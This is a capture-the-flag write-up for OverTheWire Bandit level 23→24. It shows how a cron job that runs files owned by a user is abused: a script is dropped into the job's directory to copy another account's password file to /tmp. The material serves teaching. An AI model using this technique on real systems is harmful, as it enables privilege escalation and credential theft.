# Bandit Level 23 → Level 24

## Challenge Information

- **Platform:** OverTheWire Bandit
- **Category:** Linux, Cron Jobs, Bash Scripting, File Permissions
- **Difficulty:** Beginner
- **Tools Used:** `cat`, `file`, `mktemp`, `nano`, `cp`, `chmod`, `ssh`
- **Objective:** Analyze the scheduled cron script and create a shell script that retrieves the password for `bandit24`.

## 1. Challenge Description

A cron job runs automatically as `bandit24` and executes scripts placed in a specific directory:

`/var/spool/bandit24/foo/`

The script processes files in this directory, executes eligible scripts owned by `bandit23`, and then deletes the files.

The goal is to create a shell script that reads the password file for `bandit24` and saves the password somewhere I can read it.

## 2. Inspecting the Cron Configuration

I navigated to the cron configuration directory:

```bash
cd /etc/cron.d
```

I listed and inspected the files:

```bash
file ./*
```

Then I checked the configuration for `bandit24`:

```bash
cat cronjob_bandit24
```

The output showed:

```cron
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

This indicated that the script runs at system startup and every minute as `bandit24`.

## 3. Analyzing the Cron Script

I read the script:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

The important part of its logic was:

```bash
myname=$(whoami)

cd /var/spool/"$myname"/foo || exit

for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ]; then
        owner="$(stat --format "%U" "./$i")"

        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi

        rm -rf "./$i"
    fi
done
```

### Understanding the script

- `whoami` identifies the user running the script.
- `cd /var/spool/"$myname"/foo` changes to that user's job directory.
- The `for` loop iterates through files, including hidden files.
- `stat --format "%U"` checks the owner of each file.
- `[ -f "$i" ]` checks whether the item is a regular file.
- `timeout -s 9 60 "./$i"` runs eligible files for up to 60 seconds before sending signal 9.
- `rm -rf "./$i"` removes the processed item.

The key condition is that the file must be owned by `bandit23` and be a regular file. The script then executes it as `bandit24`.

## 4. Creating a Temporary Working Directory

I created a temporary directory to store my script:

```bash
mktemp -d
```

The command returned:

```text
/tmp/tmp.BsN8KS6RWc
```

I navigated into that directory:

```bash
cd /tmp/tmp.BsN8KS6RWc
```

My first attempt used a slightly different directory name and failed. Using the exact path returned by `mktemp -d` resolved the issue.

## 5. Writing the Shell Script

I created a script named `getpass.sh`:

```bash
nano getpass.sh
```

I added the following commands:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password
```

### How the script works

- `#!/bin/bash` specifies Bash as the interpreter.
- `cat /etc/bandit_pass/bandit24` reads the password file.
- `>` redirects the output into `/tmp/bandit24_password`.

The destination is outside the cron job's processing directory, so the cron job will not delete it as part of its normal cleanup.

## 6. Submitting the Script to the Cron Job

I copied the script into the directory monitored by the cron job:

```bash
cp getpass.sh /var/spool/bandit24/foo/
```

Then I made it executable:

```bash
chmod +x /var/spool/bandit24/foo/getpass.sh
```

The script was now in the monitored directory, owned by `bandit23`, and executable. When the cron job ran, it could execute the script as `bandit24`.

**Important:** The cron job deletes processed files, so the original script in my temporary working directory served as a backup.

## 7. Retrieving the Password

After the cron job had processed the script, I read the output file:

```bash
cat /tmp/bandit24_password
```

The terminal displayed the password for `bandit24`.

The actual password is intentionally omitted from this write-up.

## 8. Logging In to bandit24

After retrieving the password, I connected to the next account:

```bash
ssh -p 2220 bandit24@bandit.labs.overthewire.org
```

I entered the retrieved password when prompted.

## 9. Key Learnings

- **Cron:** Executes commands automatically according to a schedule.
- **Shell scripting:** Automates a sequence of Linux commands in a script file.
- **`mktemp -d`:** Creates a temporary directory with a unique name.
- **`cp`:** Copies files between locations.
- **`chmod +x`:** Adds executable permission to a file.
- **File ownership:** Linux programs can check ownership before deciding whether to execute a file.
- **`timeout`:** Limits how long a command is allowed to run.
- **Output redirection (`>`):** Writes command output to a file.
- **Cron job cleanup:** Automated jobs may remove files after processing them, so keeping a separate copy of a script is useful.
- **Privilege boundaries:** A script executed by a more privileged account may access files that its creator cannot read directly.

## 10. References

- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)
- [`crontab` manual](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [`chmod` manual](https://man7.org/linux/man-pages/man1/chmod.1.html)
- [`timeout` manual](https://man7.org/linux/man-pages/man1/timeout.1.html)
- [GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/)

**Security note:** Cron jobs that execute user-controlled scripts can create privilege-escalation risks if their permissions and trust boundaries are not carefully managed. Never publish passwords or private credentials in a public repository.